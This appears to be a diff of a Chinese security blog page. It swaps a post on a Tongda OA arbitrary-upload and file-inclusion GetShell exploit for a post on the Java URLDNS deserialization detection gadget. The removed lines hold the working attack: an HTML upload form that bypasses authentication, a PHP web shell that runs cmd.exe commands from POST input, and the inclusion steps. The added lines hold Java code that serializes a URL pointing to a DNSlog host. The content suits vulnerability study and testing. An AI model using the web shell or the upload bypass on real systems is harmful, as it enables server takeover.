@@ -7,25 +7,21 @@
   
   
   
-  <title>通达OA任意文件上传/文件包含GetShell | li9hu&#39;s Blog</title>
+  <title>URLDNS反序列化无害检测 | li9hu&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x01 漏洞描述 通过绕过身份认证, 攻击者可上传任意文件, 配合文件包含即可出发远程恶意代码执行。">
+  <meta name="description" content="据说是最简单的java反序列化利用链了, 虽然不能造成危害, 但是因为全程采用的是内置类, 所以再测试反序列化漏洞的时候可以使用此gadget来检测是否真的能够进行反序列化利用。 利用链 hashCode#readObject() hashCode#hash() URL#hashCode() URLstreamHandler#handler() URLsteamHandler#hashCode()">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通达OA任意文件上传&#x2F;文件包含GetShell">
-<meta property="og:url" content="http://yoursite.com/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/index.html">
+<meta property="og:title" content="URLDNS反序列化无害检测">
+<meta property="og:url" content="http://yoursite.com/2020/07/%E7%AC%94%E8%AE%B0/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E5%AE%B3%E6%A3%80%E6%B5%8B/index.html">
 <meta property="og:site_name" content="li9hu&#39;s Blog">
-<meta property="og:description" content="0x01 漏洞描述 通过绕过身份认证, 攻击者可上传任意文件, 配合文件包含即可出发远程恶意代码执行。">
+<meta property="og:description" content="据说是最简单的java反序列化利用链了, 虽然不能造成危害, 但是因为全程采用的是内置类, 所以再测试反序列化漏洞的时候可以使用此gadget来检测是否真的能够进行反序列化利用。 利用链 hashCode#readObject() hashCode#hash() URL#hashCode() URLstreamHandler#handler() URLsteamHandler#hashCode()">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320202757.png">
-<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320205935.png">
-<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320212717.png">
-<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320221927.png">
-<meta property="article:published_time" content="2020-03-20T11:07:50.000Z">
-<meta property="article:modified_time" content="2020-04-26T06:58:39.454Z">
+<meta property="article:published_time" content="2020-07-14T05:24:19.000Z">
+<meta property="article:modified_time" content="2020-07-14T07:46:39.598Z">
 <meta property="article:author" content="li9hu">
-<meta property="article:tag" content="通达OA">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="URLDNS">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320202757.png">
   
   
     <link rel="icon" href="/img/favicon.png">
@@ -240,11 +236,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-漏洞分析/通达OA任意文件上传-文件包含GetShell" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-笔记/URLDNS反序列化无害检测" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/" class="article-date">
-      <time datetime="2020-03-20T11:07:50.000Z" itemprop="datePublished">2020-03-20</time>
+      <a  href="/2020/07/%E7%AC%94%E8%AE%B0/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E5%AE%B3%E6%A3%80%E6%B5%8B/" class="article-date">
+      <time datetime="2020-07-14T05:24:19.000Z" itemprop="datePublished">2020-07-14</time>
 </a>
 
     </div>
@@ -258,7 +254,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      通达OA任意文件上传/文件包含GetShell
+      URLDNS反序列化无害检测
     </h1>
   
 
@@ -268,13 +264,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+    <a class="article-category-link" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%80%9A%E8%BE%BEOA/" rel="tag">通达OA</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/URLDNS/" rel="tag">URLDNS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -284,123 +280,83 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="0x01-漏洞描述">0x01 漏洞描述</h3>
-<p>通过绕过身份认证, 攻击者可上传任意文件, 配合文件包含即可出发远程恶意代码执行。<a id="more"></a></p>
-<h3 id="0x02-影响版本">0x02  影响版本</h3>
-<pre><code>V11 
-2017
-2106
-2105
-2013
+        <p>据说是最简单的java反序列化利用链了, 虽然不能造成危害, 但是因为全程采用的是内置类, 所以再测试反序列化漏洞的时候可以使用此gadget来检测是否真的能够进行反序列化利用。</p>
+<p>利用链</p>
+<pre><code class="language-java">hashCode#readObject()
+hashCode#hash()
+URL#hashCode()
+URLstreamHandler#handler()
+URLsteamHandler#hashCode() --&gt; getHostAddress(u)
 </code></pre>
-<h3 id="0x03-环境搭建">0x03  环境搭建</h3>
-<p>下载<a href="https://pan.baidu.com/s/15gcdBuOFrN1F9xVN7Q7GSA" target="_blank" rel="noopener">通达V11</a> 密码<code>enqx</code></p>
-<p>使用<a href="https://paper.seebug.org/203/" target="_blank" rel="noopener">解密工具</a>对文件解密可获得所有解密代码</p>
-<p>用于分析, <a href="https://github.com/jas502n/OA-tongda-RCE/tree/master/tongda/decode" target="_blank" rel="noopener">解密后的部分代码</a></p>
-<p>将通达V11下载后直接运行EXE文件安装, 访问localhost即可。</p>
-<h3 id="0x04-漏洞分析">0x04 漏洞分析</h3>
-<p>下载官方公布的<a href="">补丁</a>, 可以看到V11版本更新两个文件[upload.php, gateway.php]。</p>
-<p>文件位置<code>/ispirit/im/upload.php</code>。对比补丁upload.php主要是修复了任意文件上传, 修复前可以自己POST变量<code>$P</code>绕过身份认证。</p>
-<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320202757.png" alt=""></p>
-<p>往下走遇到<code>$DEST_UID</code> 同样也可以通过POST的方式自行赋值。</p>
-<pre><code class="language-php">$TYPE = $_POST[&quot;TYPE&quot;];
-$DEST_UID = $_POST[&quot;DEST_UID&quot;];
-$dataBack = array();
-if (($DEST_UID != &quot;&quot;) &amp;&amp; !td_verify_ids($ids)) {
-	$dataBack = array(&quot;status&quot; =&gt; 0, &quot;content&quot; =&gt; &quot;-ERR &quot; . _(&quot;接收方ID无效&quot;));
-	echo json_encode(data2utf8($dataBack));
-	exit();
-}
+<p>采用的是hashMap类的readObject方法,最后一行调用了hash方法。传值key来自readObject所以是在writeObject的时候写入的。先跟进hash方法。<br>
+<code>hashMap#readObject()</code></p>
+<pre><code class="language-java">  K key = (K) s.readObject();
+  @SuppressWarnings(&quot;unchecked&quot;)
+  V value = (V) s.readObject();
+  putVal(hash(key), key, value, false, false);
 </code></pre>
-<p>接着到了判断文件的点, 此处可以知道文件上传的变量名为<code>ATTACHMENT</code>,后边可以自己写一个文件上传的脚本上传文件。然后我们继续跟进upload函数。</p>
-<pre><code class="language-php">if (1 &lt;= count($_FILES)) {
-	if ($UPLOAD_MODE == &quot;1&quot;) {
-		if (strlen(urldecode($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;])) != strlen($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;])) {
-			$_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;] = urldecode($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;]);
-		}
-	}
+<p>hash方法类调用了key的hashCode方法, 这里的key我们先认为传过来的是URL的一个对象(后面介绍如何设置key的值), 那么这里就会调用URL类的hashCode方法。<br>
+<code>hashMap#hash()</code></p>
+<pre><code class="language-java"> static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+    }
+</code></pre>
+<p>URL的hashCode方法调用了handler.hashCode方法, handler是一个URLStreamHandler对象。注意这里需要hashCode等于-1才能走到下面，而在URL类中hasoCode参数是private类型, 所以我们需要通过暴力反射的手段强制修改值。(注意jdk版本，高版本jdk已经不再支持暴力反射)<br>
+<code>URL#hashCode()</code></p>
+<pre><code class="language-java">transient URLStreamHandler handler;
 
-	$ATTACHMENTS = upload(&quot;ATTACHMENT&quot;, $MODULE, false);
+public synchronized int hashCode() {
+        if (hashCode != -1)
+            return hashCode;
+
+        hashCode = handler.hashCode(this);
+        return hashCode;
+    }
 </code></pre>
-<p>跳转到文件<code>inc/utility_file.php</code>。 对上传的文件进行了一系列的检查, 包括黑名单等限制,  那么我们上传jpg格式的php代码, 然后文件包含即可。</p>
-<pre><code class="language-php">if (!is_uploadable($ATTACH_NAME)) {
-				$ERROR_DESC = sprintf(_(&quot;禁止上传后缀名为[%s]的文件&quot;), substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;) + 1));
-            }
-## 黑名单
-$UPLOAD_FORBIDDEN_TYPE = &quot;php,php3,php4,php5,phpt,jsp,asp,aspx,&quot;&quot;;
+<p>URLstreamHandler里的hashCode方法中传过来的是url, 然后这里调用了<code>getHostAddress</code>, 如果传过来是一个域名那么此方法就会去请求该域名,则可以采用DNSlog的方法得到是否真正发出请求。从而验证反序列化的存在。</p>
+<pre><code class="language-java">    protected int hashCode(URL u) {
+        int h = 0;
+
+        // Generate the protocol part.
+        String protocol = u.getProtocol();
+        if (protocol != null)
+            h += protocol.hashCode();
+
+        // Generate the host part.
+        InetAddress addr = getHostAddress(u);
 </code></pre>
-<p>到此, 我们通过文件上传脚本即可成功上传文件(脚本在后面), 文件位置在<code>/attach/in/2003</code>不再网站目录里, 并且文件名前面有随机数, 而默认的上传方式不会回显文件名。我们继续往下找利用点。<br>
-<img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320205935.png" alt=""></p>
-<p><code>upload.php</code>文尾的几个MODE方法可以看到有带文件名输出的点。倒数第二行输出的<code>databack</code>里有<code>CONTENT</code>,而<code>CONTENT</code>则包含了文件名。这里我们直接POST即可将<code>UPLOAD_MODE</code>和<code>MSG_CATE</code>赋值。</p>
-<pre><code class="language-php">if ($UPLOAD_MODE == &quot;1&quot;) {
-    ......
-    ......
-	if ($MSG_CATE == &quot;file&quot;) {
-		$CONTENT = &quot;[fm]&quot; . $ATTACHMENT_ID . &quot;|&quot; . $ATTACHMENT_NAME . &quot;|&quot; . $FILE_SIZE . &quot;[/fm]&quot;;
-	}
-    else 
-    ......
-    ......
-	$dataBack = array(&quot;status&quot; =&gt; 1, &quot;content&quot; =&gt; $CONTENT, &quot;file_id&quot; =&gt; $FILE_ID);
-	echo json_encode(data2utf8($dataBack));
-	exit();
+<p>构造一个URL对象, 值设置成DNSlog地址然后序列化存储hashMap, 这样在任何一个可以触发readObject方法,我们将存储的序列化值传过去则会反序列化调用触发DNSlog查询,只要DNSlog有日志则说明此出地方的readObject是可以执行的。</p>
+<pre><code class="language-java">import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.util.HashMap;
+
+public class Test {
+    public static void main(String[] args) throws Exception {
+        HashMap hash = new HashMap();
+        URL url = new URL(&quot;http://ohohohoh.deab9f3810b2f8370319.d.zhack.ca&quot;);
+        Class cls1 =  url.getClass();
+        Field hashCode =  cls1.getDeclaredField(&quot;hashCode&quot;);
+        hashCode.setAccessible(true);
+        hashCode.set(url,99);
+        hash.put(url, 123);
+        hashCode.set(url,-1);
+        FileOutputStream fos = new FileOutputStream(&quot;obj&quot;);
+        ObjectOutputStream oos = new ObjectOutputStream(fos);
+        oos.writeObject(hash);
+        oos.close();
+//        FileInputStream fis = new FileInputStream(&quot;obj&quot;);
+//        ObjectInputStream ois = new ObjectInputStream(fis);
+//        ois.readObject();
+
+    }
 }
 </code></pre>
-<p>通过<code>UPLOAD_MODE</code>为<code>1</code>的方法, 现在我们可以知道上传的文件名是什么了, 接着就是找文件包含的点了。<br>
-<img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320212717.png" alt=""></p>
-<p>同样补丁文件也修改了<code>ispirit/interface/gateway.php</code>,我们直接查看该文件, 在最后可以看到有一处文件包含, 会对<code>json</code>变量键值进行取值, 如果遇到了<code>url</code>的键名满足一定条件可以把url包含进来。</p>
-<pre><code class="language-php">if ($json) {
-	$json = stripcslashes($json);
-	$json = (array) json_decode($json);
-	foreach ($json as $key =&gt; $val ) {
-		if ($key == &quot;data&quot;) {
-			$val = (array) $val;
-			foreach ($val as $keys =&gt; $value ) {
-				$keys = $value;
-			}
-		}
-		if ($key == &quot;url&quot;) {
-			$url = $val;
-		}
-	}
-	if ($url != &quot;&quot;) {
-		if (substr($url, 0, 1) == &quot;/&quot;) {...}
-		if ((strpos($url, &quot;general/&quot;) !== false) || (strpos($url, &quot;ispirit/&quot;) !== false) || (strpos($url, &quot;module/&quot;) !== false)) {
-			include_once $url;
-		}
-	}
-	exit();
-}
-</code></pre>
-<h3 id="0x05漏洞复现">0x05漏洞复现</h3>
-<p>漏洞位置:<code>/ispirit/im/upload.php</code></p>
-<p>构造上传的脚本和恶意文件, 并且通过上述漏洞点得到文件名。</p>
-<pre><code class="language-html">&lt;html&gt;
-&lt;body&gt;
-&lt;form action=&quot;http://127.0.0.1/ispirit/im/upload.php&quot; method=&quot;post&quot;  enctype=&quot;multipart/form-data&quot;&gt;
-&lt;input  type=&quot;text&quot;name='P' value = 1  &gt;&lt;/input&gt;
-&lt;input  type=&quot;text&quot;name='MSG_CATE' value = 'file'&gt;&lt;/input&gt;
-&lt;input  type=&quot;text&quot;name='UPLOAD_MODE' value = 1 &gt;&lt;/input&gt;
-&lt;input type=&quot;text&quot; name=&quot;DEST_UID&quot; value = 1&gt;&lt;/input&gt;
-&lt;input type=&quot;file&quot; name=&quot;ATTACHMENT&quot;&gt;&lt;/input&gt;
-&lt;input type=&quot;submit&quot; &gt;&lt;/input&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<pre><code class="language-php">&lt;?php
-//保存为jpg
-$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);  
-$exec=$phpwsh-&gt;exec(&quot;cmd.exe /c &quot;.$_POST['cmd'].&quot;&quot;);  
-$stdout = $exec-&gt;StdOut();  
-$stroutput = $stdout-&gt;ReadAll();  
-echo $stroutput;
-?&gt;
-</code></pre>
-<p>漏洞位置:<code>/ispirit/interface/gateway.php</code></p>
-<p>POST给<code>json</code>赋值, 指定<code>key</code>为<code>url</code>, <code>value</code>为恶意文件位置就行。<br>
-<img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/blog/20200320221927.png" alt=""></p>
-<h3 id="0x06-修复方案">0x06  修复方案</h3>
-<p>更新官方发布的<a href="http://www.tongda2000.com/news/673.php" target="_blank" rel="noopener">补丁</a></p>
 
       
     </div>
@@ -409,13 +365,13 @@ echo $stroutput;
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/">通达OA任意文件上传/文件包含GetShell</a></p>
+        <p><span>本文标题:</span><a  href="/2020/07/%E7%AC%94%E8%AE%B0/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E5%AE%B3%E6%A3%80%E6%B5%8B/">URLDNS反序列化无害检测</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 li9hu 的个人博客">li9hu</a></p>
-        <p><span>发布时间:</span>2020年03月20日 - 19时07分</p>
-        <p><span>最后更新:</span>2020年04月26日 - 14时58分</p>
+        <p><span>发布时间:</span>2020年07月14日 - 13时24分</p>
+        <p><span>最后更新:</span>2020年07月14日 - 15时46分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/" title="通达OA任意文件上传/文件包含GetShell">http://yoursite.com/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/　　作者: li9hu" title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/07/%E7%AC%94%E8%AE%B0/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E5%AE%B3%E6%A3%80%E6%B5%8B/" title="URLDNS反序列化无害检测">http://yoursite.com/2020/07/%E7%AC%94%E8%AE%B0/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E5%AE%B3%E6%A3%80%E6%B5%8B/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/07/%E7%AC%94%E8%AE%B0/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E5%AE%B3%E6%A3%80%E6%B5%8B/　　作者: li9hu" title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -426,18 +382,9 @@ echo $stroutput;
 
 <nav id="article-nav">
   
-    <a  href="/2020/04/%E7%AC%94%E8%AE%B0/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          java类加载器
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">python反序列化</div>
+    <a  href="/2020/07/%E7%AC%94%E8%AE%B0/RMI%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RMI记录</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -449,7 +396,7 @@ echo $stroutput;
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-漏洞描述"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-影响版本"><span class="toc-number">2.</span> <span class="toc-text">0x02  影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-环境搭建"><span class="toc-number">3.</span> <span class="toc-text">0x03  环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-漏洞分析"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05漏洞复现"><span class="toc-number">5.</span> <span class="toc-text">0x05漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-修复方案"><span class="toc-number">6.</span> <span class="toc-text">0x06  修复方案</span></a></li></ol>
+    
 </div>
 <style>
     .left-col .switch-btn {
@@ -499,13 +446,11 @@ echo $stroutput;
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2020/04/%E7%AC%94%E8%AE%B0/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/" title="上一篇: java类加载器">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="下一篇: python反序列化">
+            <a  href="/2020/07/%E7%AC%94%E8%AE%B0/RMI%E8%AE%B0%E5%BD%95/" title="下一篇: RMI记录">
                 <i class="fa fa-angle-right"></i>
             </a>
         
